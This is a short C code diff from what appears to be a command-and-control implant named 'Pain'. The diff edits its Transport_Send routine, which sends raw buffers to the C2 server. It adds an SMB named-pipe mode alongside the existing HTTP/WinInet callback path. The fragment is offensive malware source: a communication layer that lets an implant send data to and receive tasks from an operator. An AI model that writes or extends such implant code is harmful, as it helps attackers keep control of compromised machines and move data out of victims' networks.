@@ -5,13 +5,19 @@
 #include <Defines.h>
 #include <Internals.h>
 
-// Send a raw buffer to the C2 over HTTP POST.
+// Send a raw buffer to the C2.
+// In SMB mode (PROFILE_SMB) the pipe handles both send and receive in one call;
+// in HTTP mode the full callback-selection + WinInet path runs as normal.
 DECLFN BOOL Transport_Send( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len )
 {
     G_AGENT;
     Self->Ntdll.DbgPrint( "[Pain] Transport_Send() %d bytes\n", data_len );
 
-    // ── 1. Pick the active callback ───────────────────────────────────────────
+#if PAIN_PROFILE_C2 == PROFILE_SMB
+    return Smb_Send( data, data_len, out_buf, out_len );
+#endif
+
+    // 1. Pick the active callback
     PCHAR       host;
     UINT16      port;
     BOOL        ssl;
